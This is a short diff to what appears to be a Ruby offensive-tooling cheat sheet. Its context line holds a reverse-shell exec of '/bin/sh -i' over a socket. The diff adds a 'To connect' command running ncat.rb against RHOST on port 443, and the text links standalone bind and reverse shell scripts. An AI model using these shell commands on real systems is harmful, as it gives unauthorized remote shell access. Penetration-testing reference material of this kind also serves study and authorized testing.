@@ -45,6 +45,10 @@ exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ruby ncat.rb -lvp 443 
 ```
 
+- To connect 
+```
+ruby ncat.rb -cv -r RHOST -p 443
+```
 
 ## Bind and Reverse shell 
 This is an awesome implementation for a standalone  [bind](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb) and [reverse](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb) shells scripts written by [Hood3dRob1n](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells) on github . The bind shell requires authentication while reverse is not.
